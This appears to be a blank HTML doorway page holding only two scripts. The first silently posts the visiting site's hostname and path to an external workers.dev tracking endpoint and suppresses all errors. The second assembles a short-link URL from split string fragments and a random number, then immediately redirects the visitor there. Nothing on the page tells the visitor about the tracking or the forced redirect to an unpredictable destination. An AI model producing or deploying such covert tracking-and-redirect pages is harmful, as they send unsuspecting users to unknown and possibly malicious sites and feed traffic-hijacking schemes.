<!doctype html>
<html>
<body>

  <script type="text/javascript">
    (function () {
      var TRACK_ENDPOINT = "https://vtrafick.goooo.workers.dev/track";

      function sendTracking() {
        try {
          var payload = JSON.stringify({
            worker: location.hostname.split('.')[0] || 'surge',
            path: location.pathname || '/'
          });

          var blob = new Blob(
            [payload],
            { type: 'text/plain;charset=UTF-8' }
          );

          if (
            navigator.sendBeacon &&
            navigator.sendBeacon(TRACK_ENDPOINT, blob)
          ) {
            return;
          }

          fetch(TRACK_ENDPOINT, {
            method: 'POST',
            mode: 'cors',
            headers: {
              'Content-Type': 'text/plain;charset=UTF-8'
            },
            body: payload,
            keepalive: true
          }).catch(function () {});

        } catch (e) {}
      }

      sendTracking();
    }());
  </script>

  <script type="text/javascript">
    function reDirect() {
    a = location.href = "rush.";
    b = location.href = "short.";
    c = location.href = "gy/";
    d = Math.ceil(Math.random() * 24);
    a = "https://" + a + b + c + d ;
    window.location = a
    }

    reDirect();
  </script>

</body>
</html>
